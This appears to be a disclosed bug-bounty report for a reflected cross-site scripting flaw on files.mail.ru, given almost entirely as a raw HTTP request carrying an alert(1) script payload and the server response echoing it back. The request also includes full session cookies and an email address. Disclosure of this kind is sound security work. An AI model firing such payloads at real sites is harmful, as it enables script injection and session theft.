@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/13313
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 12:03:42
+
+Summary:
+
+GET /rus?back=391a1<html><script>alert(1)<%2fscript></html><!-- HTTP/1.1
+Host: files.mail.ru
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://files.mail.ru/cgi-bin/files/fupload
+Cookie: flsmlrur=0f93960946c6fb1b05366d6771c76fa3; flsmlrua=89caf034e9571bb5e7606cec2bf9d7ef; p=b0kAAEt9twAA; mref=http://my.mail.ru/video/top; mrcu=A6505381CD6669AD68F68DC71B5F; searchuid=1527834891401015703; HTML5Uploader=2; gmt=4; posts_subscriptions=isox@inbox.ru; VID=0Mm8Po3iv9HE:; _ga=GA1.2.49844597.1401016323; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAQCuwcA; current-page=month; mr1ladid=1_1000000_1000164_0; sdc=ZkNtEiOYcuxI9KMD; Mpop=1401016718:767444037873097519050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; c=69GBUwEAAJoEAAAkAAAACQAg; statistics=sub%3Aplay%3Aauditory%3Aauditory_v1%3Atargeting; s=s_vp=(2560/1279)|fver=13|dpr=1; _ym_visorc_9569476=w; __utma=41676084.49844597.1401016323.1401016976.1401016976.1; __utmb=41676084.1.10.1401016976; __utmc=41676084; __utmz=41676084.1401016976.1.1.utmcsr=my.mail.ru|utmccn=(referral)|utmcmd=referral|utmcct=/my/userinfo; mc1=1401016982; i=AQCizYFTBQATAAgKA0IBAdwEAfQEAagACAcCBQABvgABqgAIBwIFAAG+AAHvAQgEAQEAASoCBQIBAA==
+
+
+
+HTTP/1.1 302 Found
+Server: nginx
+Date: Sun, 25 May 2014 16:39:08 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Set-Cookie: flsmlrua=89caf034e9571bb5e7606cec2bf9d7ef; path=/; expires=Sun, 01 Jun 2014 16:39:08 GMT; domain=.files.mail.ru
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Location: http://files.mail.ru:80391a1<html><script>alert(1)</script></html><!--
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Content-Length: 401
+
+Status: 302 Found
+Location: http://files.mail.ru:80391a1<html><script>alert(1)</script></html><!--
+Content-Type: text/html
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<HTML><HEAD>
+<TITLE>302 Found</TITLE>
+</HEAD><BODY>
+<H1>Found</H1>
+The document has moved <A HREF="http://files.mail.ru:80391a1&lt;html&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/html&gt;&lt;!--">here</A>.<P>
+</BODY></HTML>
